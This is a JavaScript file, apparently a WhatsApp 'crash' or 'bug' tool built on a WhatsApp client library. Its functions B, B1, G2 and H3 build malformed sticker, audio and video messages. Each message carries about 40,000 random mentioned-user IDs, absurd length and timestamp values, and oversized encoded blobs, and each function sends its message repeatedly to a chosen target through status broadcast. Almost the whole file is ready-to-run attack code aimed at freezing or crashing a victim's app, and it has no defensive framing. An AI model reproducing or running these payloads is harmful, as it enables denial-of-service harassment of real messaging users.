function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function A(sock, target) {
    console.log("LLL")
    //sock.sendMessage(target, { text: "hello" }, {})

}
async function B(sock, target) {
    console.log("Starting B")
    await A(sock, target)
    let message = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                    mimetype: "image/webp",
                    directPath:
                        "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                    fileLength: { low: 1, high: 0, unsigned: true },
                    mediaKeyTimestamp: {
                        low: 1746112211,
                        high: 0,
                        unsigned: false,
                    },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: {
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                {
                                    length: 40000,
                                },
                                () =>
                                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            ),
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                    },
                    stickerSentTs: {
                        low: -1939477883,
                        high: 406,
                        unsigned: false,
                    },
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                },
            },
        },
    };

    for (let i = 0; i < 2; i++) {

        const msg = generateWAMessageFromContent(target, message, {});

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined,
                                },
                            ],
                        },
                    ],
                },
            ],
        });
        console.log(`${i} B Packet To ${target}`)
        await sleep(1000)
    }
}

async function B1(sock, jid) {
    let parse = true;
    let SID = "5e03e0&mms3";
    let key = "10000000_2012297619515179_5714769099548640934_n.enc";
    let type = `image / webp`;
    if (11 > 9) {
        parse = parse ? false : true;
    }

    let message = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true",
                    fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                    fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                    mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                    mimetype: type,
                    directPath:
                        "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileLength: {
                        low: Math.floor(Math.random() * 1000),
                        high: 0,
                        unsigned: true,
                    },
                    mediaKeyTimestamp: {
                        low: Math.floor(Math.random() * 1700000000),
                        high: 0,
                        unsigned: false,
                    },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: {
                        participant: jid,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                {
                                    length: 1000 * 40,
                                },
                                () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                            ),
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                    },
                    stickerSentTs: {
                        low: Math.floor(Math.random() * -20000000),
                        high: 555,
                        unsigned: parse,
                    },
                    isAvatar: parse,
                    isAiSticker: parse,
                    isLottie: parse,
                },
            },
        },
    };

    for (let i = 0; i < 2; i++) {
        const msg = generateWAMessageFromContent(jid, message, {});

        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [jid],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: jid },
                                    content: undefined,
                                },
                            ],
                        },
                    ],
                },
            ],
        });
        console.log(`${i} B1 Packet To ${jid}`)
        await sleep(1000)
    }
}

async function G2(sock, isTarget, mention) {
    const floods = 40000;
    const mentioning = "13135550002@s.whatsapp.net";
    const mentionedJids = [
        mentioning,
        ...Array.from({ length: floods }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
    const mime = "audio/mpeg";
    const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
    const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
    const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
    const timestamp = 99999999999999;
    const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
    const longs = 99999999999999;
    const loaded = 99999999999999;
    const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

    const messageContext = {
        mentionedJid: mentionedJids,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
        }
    };

    const messageContent = {
        ephemeralMessage: {
            message: {
                audioMessage: {
                    url: links,
                    mimetype: mime,
                    fileSha256: sha,
                    fileLength: longs,
                    seconds: loaded,
                    ptt: true,
                    mediaKey: key,
                    fileEncSha256: enc,
                    directPath: path,
                    mediaKeyTimestamp: timestamp,
                    contextInfo: messageContext,
                    waveform: data
                }
            }
        }
    };

    for (let i = 0; i < 2; i++) {
        const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

        const broadcastSend = {
            messageId: msg.key.id,
            statusJidList: [isTarget],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: isTarget }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        };

        await sock.relayMessage("status@broadcast", msg.message, broadcastSend);

        if (mention) {
            await sock.relayMessage(isTarget, {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            }, {
                additionalNodes: [{
                    tag: "meta",
                    attrs: {
                        is_status_mention: " null - exexute "
                    },
                    content: undefined
                }]
            });
        }
        console.log(`${i} G2 Packet To ${isTarget}`)
        await sleep(1000)
    }
}

async function H3(sock, targetNumber) {
    try {
        const message = {
            viewOnceMessage: {
                message: {
                    videoMessage: {
                        interactiveAnnotations: [],
                        annotations: [
                            {
                                embeddedContent: {
                                    musicContentMediaId: "12345789451",
                                    songId: "88888888888888",
                                    author: "No One Care!",
                                    title: "No One Care!",
                                    artworkDirectPath:
                                        "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256:
                                        "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                                    artistAttribution: "https://www.instagram.com/_u/noonecare",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey:
                                        "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
                                },
                                embeddedAction: true,
                            },
                        ],
                        caption: `< StunnerMP4 >`,
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0&mms3=true",
                        mimetype: "video/mp4",
                        fileSha256: "bvkPnStTimcqgvugKm2jV1cKSAdJ00DnnKR31N/aH0Q=",
                        fileLength: {
                            low: 55438054,
                            high: 0,
                            unsigned: true,
                        },
                        seconds: 312,
                        mediaKey: "XSc3T7jk+OhrNGSH4gMZQFnzL7boede9orqrG4a+QZ0=",
                        height: 864,
                        width: 480,
                        fileEncSha256: "krpFGEDnkho/kNIQRY6qCYfzxdaxNzdW2H5fli3qg64=",
                        directPath:
                            "/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0",
                        mediaKeyTimestamp: {
                            low: 1745804782,
                            high: 0,
                            unsigned: false,
                        },
                        jpegThumbnail:
                            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAAAgMEAQUBAQADAQAAAAAAAAAAAAAAAAUCAwQB/9oADAMBAAIQAxAAAADQBgiiyUpiMRT3vLsvN62wHjoyhr2+hRbQgh10QPSU23aa8mtJCxAMOwltmOwUV9UCif/EACAQAAICAQQDAQAAAAAAAAAAAAECAAMRBBASQSAhMTL/2gAIAQEAAT8A87dRXUQD9MR1sGR4U1VW2O7DLAwoqWMF3uc1oSBNAHBsdgfYlFhNjqd9R+FUdypVFSLKqqxa7Be5cvFztYpZlz1FxGbg2RLWD8W2tOBFsyoxMl3Ajn2AOttSwAEV5QQQzb6wkcIbSBK7XxgGD4J//8QAIhEBAAICAQIHAAAAAAAAAAAAAQACAxIhBBAREyMxUWGS/9oACAECAQE/AJrYNvDjtWrZAmWvop8HbpdRss45mauuSxMAv7JYNWXs2srOnXzaH3GPuz//xAAiEQACAQMEAgMAAAAAAAAAAAABAgADERIEECExE2EkMlH/2gAIAQMBAT8AmDBcsTb92RWdgqjmV0+MVA6G2jsM2l7SuuNVx7lAHD0XWfbiVGLuzGadj5EW/F9j2Z//2Q==",
                        contextInfo: {
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    {
                                        length: 42000,
                                    },
                                    () =>
                                        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                                ),
                            ],
                            groupMentions: [],
                        },
                        streamingSidecar:
                            "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